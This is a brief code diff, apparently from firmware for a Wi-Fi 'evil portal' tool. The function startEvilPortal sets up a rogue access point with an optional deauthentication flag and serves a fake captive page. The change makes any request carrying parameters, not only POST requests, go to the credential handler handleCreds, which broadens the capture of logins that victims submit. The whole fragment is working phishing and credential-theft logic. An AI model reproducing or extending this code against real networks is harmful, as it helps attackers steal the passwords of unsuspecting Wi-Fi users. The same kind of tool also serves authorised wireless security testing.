@@ -83,7 +83,7 @@ void startEvilPortal(String tssid, uint8_t channel, bool deauth) {
     ep->on("/post", handleCreds);
 
     ep->onNotFound([](){
-      if (ep->method() == HTTP_POST) {
+      if (ep->args()>0) {
         handleCreds();
       } else {
         ep->send(200, "text/html", html_file);
